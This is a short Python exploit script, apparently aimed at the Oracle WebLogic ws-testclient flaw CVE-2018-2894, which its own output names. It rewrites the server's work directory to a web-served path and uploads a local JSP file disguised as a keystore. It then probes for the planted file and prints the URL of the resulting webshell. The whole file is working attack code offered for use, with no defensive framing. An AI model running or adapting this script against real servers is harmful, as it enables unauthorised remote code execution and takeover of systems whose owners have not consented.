#coding=utf-8
from time import time
import sys
from requests_toolbelt import MultipartEncoder
import requests
from bs4 import BeautifulSoup


def attack(url):
    headers = {"User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36"}
    data = {
        "setting_id":"general",
            "BasicConfigOptions.workDir":"/u01/oracle/user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_internal/com.oracle.webservices.wls.ws-testclient-app-wls/4mcj4y/war/css",
            "asicConfigOptions.proxyHost":'',
            "BasicConfigOptions.proxyPort":'80'
    }
    urlSet = url + '/ws_utc/resources/setting/options'
    resp = requests.post(url=urlSet,headers=headers,data=data)
    if "Save successfully" in resp.text :
        upload(url)
    else:
        print("不存在该漏洞")

def upload(url):
    data = MultipartEncoder( {
        "ks_name":"1",
        "ks_edit_mode":"false",
        "ks_password_front":"3123",
        "ks_password":"3123",
        "ks_password_changed":"true",
        "ks_filename":("a.jsp",open('./a.jsp','rb'),'application/octet-stream')
    })
    headers = {
        "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36",
        "Content-Type":data.content_type
    }
    urlUpload = url + '/ws_utc/resources/setting/keystore?timestamp=' + str(time()).split('.')[0]
    resp = requests.post(url=urlUpload,data=data,headers=headers,proxies={"http":"http://127.0.0.1:8081/"})
    soup = BeautifulSoup(resp.text, 'xml')
    timestamps = soup.find_all("id")
    for timestamp in timestamps:
        filename = timestamp.string + '_a.jsp'
        resp2 = requests.get(url=url+'/ws_utc/css/config/keystore/'+filename,headers=headers)
        if resp2.status_code == 500:
            print("可能存在CVE-2018-2894,尝试连接该webshell:"+url+'/ws_utc/css/config/keystore/'+filename)
            break

if __name__ == '__main__':
    attack(sys.argv[1])


